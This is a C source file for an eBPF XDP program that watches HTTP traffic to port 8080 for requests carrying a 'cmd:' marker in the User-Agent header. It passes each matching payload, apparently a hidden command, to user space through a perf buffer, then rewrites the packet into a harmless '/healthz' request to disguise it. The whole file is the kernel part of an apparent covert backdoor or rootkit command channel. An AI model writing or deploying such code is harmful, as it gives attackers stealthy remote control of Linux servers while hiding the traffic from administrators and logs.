#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_endian.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include "main.h"

struct {
    __uint(type, BPF_MAP_TYPE_PERCPU_ARRAY);
    __type(key, u32);
    __type(value, struct event_t);
    __uint(max_entries, 1);
} tmp_storage SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);
    __uint(key_size, sizeof(u32));
    __uint(value_size, sizeof(u32));
} events SEC(".maps");

SEC("xdp")
int handle_xdp(struct xdp_md *ctx) {
    // GET /healthz HTTP/1.1\r\n
    // Host: 127.0.0.1:8080\r\n
    // User-Agent: curl/7.81.0 cmd:test\r\n
    // Accept: */*\r\n
    char keyword[] = "GET /route-1 HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nUser-Agent: curl/7.81.0 cmd:";
    int keyword_size = 73;
    char cmd_len = 20;
    char replace[] = "GET /healthz HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nUser-Agent: curl/7.81.0\r\nCache-Control: no-cache";
    char replace_size = 93;
    int target_port = 8080;

    // 通过指针操作解析数据包
    void *data_end = (void *)(long)ctx->data_end;
    void *data = (void *)(long)ctx->data;

    // 从 IP 首部中过滤协议类型，只处理 TCP 协议
    struct iphdr *ip_hdr = data + ETH_HLEN;
    if ((void *)ip_hdr + sizeof(struct iphdr) > data_end) {
        return XDP_PASS;
    }
    if (ip_hdr->protocol != IPPROTO_TCP) {
        return XDP_PASS;
    }

    // TCP 协议数据过滤
    struct tcphdr *tcp_hdr = (void *)ip_hdr + sizeof(struct iphdr);
    if ((void *)tcp_hdr + sizeof(struct tcphdr) > data_end) {
        return XDP_PASS;
    }
    if (tcp_hdr->dest != bpf_htons(target_port)) {
        return XDP_PASS;
    }

    // 过滤关键字
    char *payload = (void *)tcp_hdr + tcp_hdr->doff * 4;
    unsigned int payload_size = bpf_htons(ip_hdr->tot_len) - (tcp_hdr->doff * 4) - sizeof(struct iphdr);
    if (payload_size < keyword_size + cmd_len) {
        return XDP_PASS;
    }
    if ((void *)payload + keyword_size + cmd_len > data_end) {
        return XDP_PASS;
    }
    if ((void *)payload + replace_size > data_end) {
        return XDP_PASS;
    }
    if (!str_eq(payload, keyword, keyword_size)) {
        return XDP_PASS;
    }

    int zero = 0;
    struct event_t *event;
    event = bpf_map_lookup_elem(&tmp_storage, &zero);
    if (!event) {
        return XDP_PASS;
    }

    event->src_addr = ip_hdr->saddr;
    event->dest_addr = ip_hdr->daddr;
    event->src_port = bpf_ntohs(tcp_hdr->source);
    event->dest_port = bpf_ntohs(tcp_hdr->dest);

    bpf_probe_read_kernel(&event->payload, sizeof(event->payload), payload);

    bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, event, sizeof(*event));

    // 将数据包替换为正常的健康检查流量
#pragma unroll
    for (int i = 0; i < replace_size; i++) {
        payload[i] = replace[i];
    }

    return XDP_PASS;
}

char _license[] SEC("license") = "GPL";
